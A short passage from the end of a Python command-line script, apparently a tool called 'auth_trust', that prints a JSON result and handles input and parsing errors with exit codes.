                                       overrides=overrides, storage_key=args.storage_key,
                                       cookie_name=args.cookie_name)
        out = json.dumps(result, indent=2, sort_keys=True, ensure_ascii=False)
    except AuthInputError as exc:
        print(f"auth_trust: {exc}", file=sys.stderr)
        return 2
    except (RecursionError, ValueError) as exc:
        print(f"auth_trust: malformed input ({type(exc).__name__})", file=sys.stderr)
        return 2
    print(out)
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
